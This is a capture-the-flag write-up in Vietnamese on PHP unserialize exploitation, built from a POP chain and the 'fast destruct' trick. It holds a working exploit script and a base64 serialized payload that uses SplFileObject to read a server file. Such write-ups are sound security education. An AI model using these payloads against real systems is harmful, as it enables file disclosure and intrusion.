# Solution

Source code:
```php
<?php

highlight_file(__FILE__);

class main{
    public $class;
    public $param;
    public function __construct($class="test",$param="Onion")
    {
        $this->class = $class;
        $this->param = $param;
        echo new $this->class($this->param);
    }
    public function __destruct(){
        echo new $this->class->cc($this->param);
    }

}

class test{
    var $str;
    public function __construct($str)
    {
        $this->str = $str;
        echo ("Welcome to ".$this->str);
    }
}

class do_nothing{
    public $a;
    public $b;
    public function __construct($a,$b){
        $this->a = $a;
        $this->b = $b;
    }
    public function __get($method){
        if(isset($this->a)){
            return $this->b;
        }
        return $method;
    }
}

if(isset($_GET['payload'])){
    unserialize(base64_decode($_GET['payload']));
    throw new Exception("ga");
}
else{
    $main = new main;

}
```

Đây là một bài [POP CHAIN](https://to016.github.io/posts/phpPopChain/) sử dụng kĩ thuật `fast destruct`.

Ở đây dễ thấy method `__destruct__` sẽ trigger gadgets.
Đập vào mắt mình tiếp theo đó là `__get` method của `do_nothing` ở đây để ý method này + `echo new $this->class->cc($this->param);` của `main`.

```php
$d = new do_nothing("ba", "la");
echo $d -> c;
```

Output: `la`

Vậy nếu gán `$class` của `main` thành `do_nothing`, `$a=1` và `$b=<tên hàm>` và truyền thông số cho hàm thông qua `$param` của `main` thì có thể tạo được một class bất kì kèm với một tham số.

Tác giả dùng `echo new $this->class->cc($this->param);` => sẽ trigger method `__toString` của class vừa được tạo.

Và tiếp theo mình viết script để tìm các built-in class trong php có method `__toString`:

```php
$declared_classes = get_declared_classes();

foreach ($declared_classes as $cls){
    if(method_exists($cls, '__toString'))
    {
        echo "FOUND: " . $cls. "\n";
    }
}
```

Sau khi search ở `php.net` thì mình tìm ra được 2 class quan trọng để solve bài này
- `FilesystemIterator`: để tìm vị trí file flag
- `SplFileObject`: để đọc file

Còn về cách áp dụng kĩ thuật `fast destruct` để bypass `throw new Exception("ga");` thì xem tại [đây](https://github.com/hinemo123/WriteUp/tree/master/Deserialize).


Script:

```php
<?php 

class main {}

class do_nothing{
    public $a = 1;
    public $b = "SplFileObject";
}


$dnth = new do_nothing();


$m = new main();
$m -> class = new do_nothing();
$m -> param = "./ahyeah_flag_here_cat_me_plss/flag.php";

#echo serialize(array(1 => $m, 2 => 2));
echo base64_encode('a:2:{i:1;O:4:"main":2:{s:5:"class";O:10:"do_nothing":2:{s:1:"a";i:1;s:1:"b";s:13:"SplFileObject";}s:5:"param";s:39:"./ahyeah_flag_here_cat_me_plss/flag.php";}i:1;i:2;}');
```

Và flag:

![flag](https://user-images.githubusercontent.com/77546253/176494329-01527b07-18fa-490a-afb5-cf870b17d0d3.png)



